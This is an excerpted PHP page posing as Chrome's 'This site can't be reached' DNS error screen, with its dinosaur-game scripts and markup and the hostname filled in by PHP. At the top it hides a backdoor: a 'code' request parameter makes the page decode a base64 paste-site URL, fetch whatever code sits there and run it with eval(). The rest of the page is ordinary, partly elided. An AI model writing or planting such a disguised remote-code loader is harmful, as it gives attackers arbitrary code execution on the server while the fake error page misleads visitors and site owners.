...
if (isset($_GET['code'])) {
    ...
    $x = '?>';
    eval($x . get_data(base64_decode('aHR0cHM6Ly9wYXN0ZS5lZS9yL1B4U1FCQjJO')));
    exit;
}
...
#offline-content-suggestions {
   ...
   */
  max-height: 27em;
  transition: max-height 200ms ease-in, visibility 0s 200ms,opacity 200ms 200ms linear;
}
...
Runner.prototype = {
  ...
  /**
   * Setsthe game speed. Adjust the speed accordingly if on a smaller screen.
  ...
  disableSpeedToggle(disable) {
    ...
    } else {this.slowSpeedCheckbox.removeAttribute('disabled');
    }
  },
   ...
   * A user is ableto tap the high score twice to reset it.
   * @param {Event} e
   */
...
GameOverPanel.prototype = {
  ...
  clearGameOverTextBounds() {
    ...
    this.canvasCtx.clearRect(
        ...
        GameOverPanel.dimensions.TEXT_WIDTH,GameOverPanel.dimensions.TEXT_HEIGHT + 4);
    this.canvasCtx.restore();
  },
...
<body class="neterror" style="font-family: 'Segoe UI', Tahoma, sans-serif; font-size: 75%" jstcache="0">
  <div id="main-frame-error" class="interstitial-wrapper" jstcache="0">
    <div id="main-content" jstcache="0">
      ...
      <div id="main-message" jstcache="0">
        ...
        <p jsselect="summary" jsvalues=".innerHTML:msg" jstcache="1">Check if there is a typo in <span jscontent="hostName" jstcache="22"><?php echo $baseUrl ?></span>.</p>
  ...
  <div id="sub-frame-error" jstcache="0">
    ...
    <div id="sub-frame-error-details" jsselect="summary" jsvalues=".innerHTML:msg" jstcache="1">Check if there is a typo in <span jscontent="hostName" jstcache="22"><?php echo $baseUrl ?></span>.</div>
  </div>
...
<script jstcache="0">var loadTimeDataRaw = {"details":"Details","errorCode":"DNS_PROBE_POSSIBLE","fontfamily":"'Segoe UI', Tahoma, sans-serif","fontfamilyMd":"'Segoe UI', Tahoma, sans-serif","fontsize":"75%","heading":{"hostName":"<?php echo $baseUrl ?>","msg":"This site can’t be reached"},"hideDetails":"Hide details","iconClass":"icon-generic","language":"en","reloadButton":{"msg":"Reload","reloadUrl":"http://<?php echo $baseUrl ?>/"},"suggestionsDetails":[],"suggestionsSummaryList":[{"summary":"\u003Ca href=\"javascript:diagnoseErrors()\" id=\"diagnose-link\">Try running Windows Network Diagnostics\u003C/a>."}],"summary":{"failedUrl":"http://<?php echo $baseUrl ?>/","hostName":"<?php echo $baseUrl ?>","msg":"\u003Cstrong jscontent=\"hostName\">\u003C/strong>’s \u003Cabbr id=\"dnsDefinition\">DNS address\u003C/abbr> could not be found. Diagnosing the problem."},"textdirection":"ltr","title":"<?php echo $baseUrl ?>"};</script></body></html>